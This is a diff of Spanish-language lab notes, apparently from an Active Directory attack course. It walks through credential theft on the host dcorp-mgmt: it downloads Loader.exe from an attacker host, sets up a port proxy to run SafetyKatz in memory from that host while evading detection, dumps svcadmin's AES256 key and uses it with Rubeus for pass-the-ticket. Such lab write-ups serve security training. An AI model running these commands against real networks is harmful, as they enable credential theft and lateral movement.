@@ -413,30 +413,35 @@ Encontrando una sesión de administrador de dominio en dcorp-mgnt podemos aprove
 winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 ```
 
-Pudiendo enumerar el nombre del equipo y del usuario la idea ahora seria extraer las credenciales del usuario, usando SafetyKatz.
+Pudiendo enumerar el nombre del equipo y del usuario la idea ahora seria extraer las credenciales del usuario, usando *SafetyKatz*.
+
 Primero tendremos que enviarle Loader.exe a la maquina de dcorp-ci, es una herramienta la cual nos ayudara a poder ejecutar SafetyKatz en memoria, después de ahí la deberemos de copiar a dcorp-mgnt y poder ejecutar SafetyKatz
 
 Nos la copiamos a la maquina dcorp-ci
 ```shell
+[Jenkins-dcorp-ci]
 iwr http://172.16.100.97/Loader.exe -OutFile C:\Users\Public\Loader.exe
 ```
 
 Y nos la copiamos a dcorp-mgnt
 ```shell
+[Jenkins-dcopr-ci]
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
 Ahora haremos un renvió de puertos en dcorp-mgnt para evitar la detección en este
 ```shell
+[Jenkins-dcorp-ci]
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97"
 ```
 
 Ahora para ejecutar SafetyKatz y poder ejecutarlo en la memoria 
 ```shell
+[Jenkins-dcorp-ci]
 $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
 ```
 
-Obteniendo las credenciales de svcadmin, ahora con Rubeus en una nueva terminal como administrador  le pasaremos el hash aes256 y se nos permitirá conectarnos vía winrs
+Obteniendo las credenciales de svcadmin *6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011* , ahora con Rubeus en una nueva terminal como administrador  le pasaremos el hash *aes256* y se nos permitirá conectarnos vía winrs
 ```shell
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
